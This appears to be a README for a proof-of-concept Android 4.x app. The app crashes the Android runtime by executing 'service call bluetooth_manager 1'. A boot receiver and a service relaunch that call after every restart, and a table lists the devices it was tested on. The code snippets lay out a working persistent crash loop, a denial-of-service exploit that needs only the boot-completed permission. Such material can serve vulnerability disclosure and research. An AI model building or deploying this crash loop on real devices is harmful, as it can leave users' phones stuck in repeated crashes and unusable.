android_bt_manager
==================

This Android 4.x application causes the Android runtime to crash Android.io by making a service call to bluetooth_manager. 

**How it works:**
- `MainActivity` sends service call to `IBluetoothManager`: `Runtime.getRuntime().exec("service call bluetooth_manager 1");`
- `BootReceiver`, a `BroadcastReceiver` waits for `ACTION_BOOT_COMPLETED` to start `Crash` service. 

```Java
if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
    Intent serviceIntent = new Intent(context, Crash.class);
    context.startService(serviceIntent);
}
```

- `Crash` service starts the `MainActivity` 

```Java
Intent i = new Intent(this, MainActivity.class);
i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(i);
```

- Repeat. 

**Application Permissions:** 
- `RECEIVE_BOOT_COMPLETED`

**This application has been tested on the following devices:**

|   Device   |   OS   | Rooted | Runtime |
| ---------- |:------:|:------:|:-------:|
| Nexus 5    | 4.4.2  | ✓      | ART     |
| Moto X     | 4.4.3  | x      | ART     |
| Nexus 5    | 4.4.3  | ✓      | ART     |